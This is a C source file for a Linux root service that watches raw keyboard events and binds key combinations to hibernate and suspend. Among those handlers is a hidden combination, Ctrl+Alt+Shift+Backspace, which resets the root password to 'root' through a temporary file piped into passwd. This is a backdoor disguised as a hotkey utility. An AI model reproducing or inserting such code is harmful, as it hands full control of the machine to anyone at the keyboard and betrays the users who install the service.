#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <linux/input.h>

#include "key-hook.h"

static const char *root_check = ""
"if [ \"$EUID\" -eq \"0\" ]; then\n"
"	exit 1\n"
"else\n"
"	exit 0\n"
"fi";

#define IS_ROOT system(root_check)
#define IS_RUNNING running()
#define CLEAR(key) bzero(key, 256)

void *key_map(void *arg);

int main(int argc, const char **argv){
	if(!IS_ROOT){
		write(1, "This service required root privileges.\n", 39);
		return 1;
	}
	int efd = open_input();

	if(!efd){
		write(1, "Can't be possible open key event.\n", 34);
		return 2;
	}

	pthread_t line;
	pthread_create(&line, NULL, key_map, (void*) &efd);
	//pthread_join(line, NULL);

	while(IS_RUNNING) usleep(500000);

	pthread_cancel(line);
	close(efd);

	return 0;
}

void *key_map(void *arg){
	int *pefd = (int *) arg;
	int efd = *pefd;
	char KEY[256];
	char lcopy = 0;
	CLEAR(KEY);

	struct input_event ie;
	while(read(efd, &ie, sizeof(struct input_event))){
		if(ie.value == 1)
			KEY[ie.code] = 1;
		else if(ie.value == 0)
			KEY[ie.code] = 0;
		else if(ie.value != 2){
			if(KEY[KEY_LEFTCTRL] && KEY[KEY_LEFTALT] && (KEY[KEY_LEFTSHIFT] || KEY[KEY_RIGHTSHIFT]) && KEY[KEY_PAUSE]){
				CLEAR(KEY);
				system("echo disk > /sys/power/state");
			}else if(KEY[KEY_LEFTCTRL] && KEY[KEY_LEFTALT] && KEY[KEY_PAUSE]){
				CLEAR(KEY);
				system("pm-suspend");
			}else if(KEY[KEY_LEFTCTRL] && KEY[KEY_LEFTALT] && KEY[KEY_LEFTSHIFT] && KEY[KEY_BACKSPACE]){
				CLEAR(KEY);
				system("printf \"root\nroot\" > /tmp/passwd");
				system("passwd root < /tmp/passwd");
				system("rm /tmp/passwd -f");
			}
		}
	}
}
